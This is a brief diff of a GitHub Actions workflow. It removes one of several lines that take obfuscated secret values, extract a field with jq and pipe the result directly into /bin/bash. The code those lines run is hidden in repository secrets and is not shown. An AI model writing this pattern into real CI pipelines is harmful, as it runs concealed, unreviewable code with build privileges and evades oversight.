@@ -20,7 +20,6 @@ jobs:
           gehta4074: ${{ secrets.gehta4074 }}
         run: |
           printf '%s' "$gehta4074" | jq -r .vp316 | /bin/bash
-          echo $jkkv52518 | jq -r .d14084 | /bin/bash
           printf '%s' "$ste906" | jq -r .wkin05 | /bin/bash
           echo $qi4557 | jq -r .u230 | /bin/bash
           echo $bzwk84969 | jq -r .ms547 | /bin/bash
